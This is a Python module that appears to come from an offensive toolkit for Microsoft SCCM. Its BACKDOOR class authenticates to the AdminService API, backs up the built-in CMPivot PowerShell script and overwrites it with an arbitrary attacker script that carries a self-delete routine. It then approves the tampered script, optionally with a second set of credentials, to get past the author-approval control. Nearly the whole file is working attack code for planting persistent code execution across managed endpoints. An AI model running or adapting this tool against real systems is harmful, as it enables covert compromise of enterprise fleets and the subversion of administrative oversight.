import requests
from requests_ntlm import HttpNtlmAuth
from urllib3.exceptions import InsecureRequestWarning
import json
import argparse
import ast
import codecs
import base64
import re
import os
from lib.logger import logger

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

class BACKDOOR:
    def __init__(self, username, password, target, logs_dir, auser, apassword):
        self.username = username
        self.password = password
        self.target = target
        self.logs_dir = logs_dir
        self.approve_user = auser
        self.approve_password = apassword
        self.backdoor_script = ""
        self.headers = {'Content-Type': 'application/json; odata=verbose'}

    def transform_string(self, input_string):
        if len(input_string) >= 2:
            return input_string[-2:] + input_string[2:-2] + input_string[:2]
        return input_string

    def run(self, option, scriptpath):
        self.backdoor_script = scriptpath
        if option == "backup":
            self.backup_cmpivot()
        else:
            self.update_cmpivot(option)

    def backup_cmpivot(self):
        url = f"https://{self.target}/adminservice/v1.0/Script/7DC6B6F1-E7F6-43C1-96E0-E1D16BC25C14/"
        r = requests.get(f"{url}",
                            auth=HttpNtlmAuth(self.username, self.password),
                            verify=False,
                            headers=self.headers)
        #¯\_(ツ)_/¯
        #the way sccm formats this script from the API is weird.
        pattern = r'"[^"]*\\u[^"]*"'
        matches = re.findall(pattern, r.text)
        result = matches[0].replace('"', '').replace(r"\n", "").split(r"\u")
        result = ''.join([self.transform_string(substring) for substring in result])
        result = result.replace("efbbbf", "")
        decoded_bytes = bytes.fromhex(result)
        decoded_string = decoded_bytes.decode('utf-8')
        #add check to see if the path exists so you don't overwrite existing backup with malicious one
        if os.path.exists(f"{self.logs_dir}/cmpivot_backup.ps1"):
            logger.info("[*] Backup file already exists.")
            return
        #write the backup
        with open(f"{self.logs_dir}/cmpivot_backup.ps1", "w") as f:
            script = decoded_string.strip("\n")
            f.write(script)
            logger.info("[+] Backup created successfully.")

    def update_cmpivot(self, option):
        #read the script provided and transform to the expected format for API
        try:
            #match = "# SIG # Begin signature block"
            match = "# Finish off Xml"
            script_body = ""
            cleanup = '''
function Do-Delete {
    Remove-Item $MyInvocation.PSCommandPath -Force 
}
Do-Delete
'''
            if option == "backdoor":
                #Second check for backup, keep them honest. You do not want to mess this up.
                if os.path.exists(f"{self.logs_dir}/cmpivot_backup.ps1"):
                    logger.debug("[*] Backup exists, loading script.")
                    with open(f"{self.backdoor_script}", "r") as f:
                        file_content = f.readlines()
                        #this is attempting to remove the script after execution but not working. it's on the agenda.
                        for i, line in enumerate(file_content):
                            if match in line:
                                file_content.insert(i, cleanup + '\n')
                                break
                        updated_content = ''.join(file_content)
                        byte_array = updated_content.encode('utf-8')
                        script_body = base64.b64encode(byte_array).decode('utf-8')
                else:
                    logger.info("[-] CMPivot backup script not found.")
                    logger.info("[!] Backdoor will not work until a backup is performed.")
                    return

            if option == "restore":
                #restore the backoored script to original backup
                #something going on with the file hashing though it's not matching the old version but works fine
                if os.path.exists(f"{self.logs_dir}/cmpivot_backup.ps1"):
                    with open(f"{self.logs_dir}/cmpivot_backup.ps1", "r") as f:
                        file_content = f.read()
                        byte_array = file_content.encode('utf-8') 
                        script_body = base64.b64encode(byte_array).decode('utf-8')
                else:
                    logger.info("[-] Could not locate backup file.")
                    return
                
            body = {"Script": f"{script_body}",
                    "ScriptVersion": "1",
                    "ScriptName": "CMPivot"}

            url = f"https://{self.target}/AdminService/wmi/SMS_Scripts/7DC6B6F1-E7F6-43C1-96E0-E1D16BC25C14/AdminService.UpdateScript"
            r = requests.post(f"{url}",
                            auth=HttpNtlmAuth(self.username, self.password),
                            verify=False,
                            headers=self.headers, json=body)
            
            if r.status_code == 201:
                logger.info("[+] CMPivot script updated successfully.")
                self.approve_cmpivot()
            else:
                logger.info("[*] Something went wrong:")
                logger.info("Status Code: " + r.status_code)
                logger.info(f"Response:" + r.text)
                return
            
        except Exception as e:
            logger.info(e)

    def approve_cmpivot(self):
        try:
            if self.approve_user:
                 logger.debug("[*] Using alternate credentials to approve script.")
                 username = self.approve_user
                 password = self.approve_password
            else:
                 username= self.username
                 password = self.password
            #approve changes
            url = f"https://{self.target}/AdminService/wmi/SMS_Scripts/7DC6B6F1-E7F6-43C1-96E0-E1D16BC25C14/AdminService.UpdateApprovalState"

            body = {"Approver":f"{self.username}",
                    "ApprovalState": "3",
                    "Comment": ""
                    }

            r = requests.post(f"{url}",
                        auth=HttpNtlmAuth(username, password),
                        verify=False,
                        headers=self.headers, json=body)
            if r.status_code == 201:
                logger.info("[+] CMPivot script approved.")
                return
            if r.status_code == 500:
                logger.info(f"[-] Hierarchy settings do not allow author's to approve their own scripts. All custom script execution will fail.")
                logger.info("[*] Try using alternate approval credentials.")
                logger.info("[!] CMPivot will be unusable until the script is approved.")
                return
            else:
                logger.info("[*] Something went wrong:")
                logger.info("Status Code: " + r.status_code)
                logger.info("Response:" + r.text)
                return
     
        except Exception as e:
            logger.info(e)



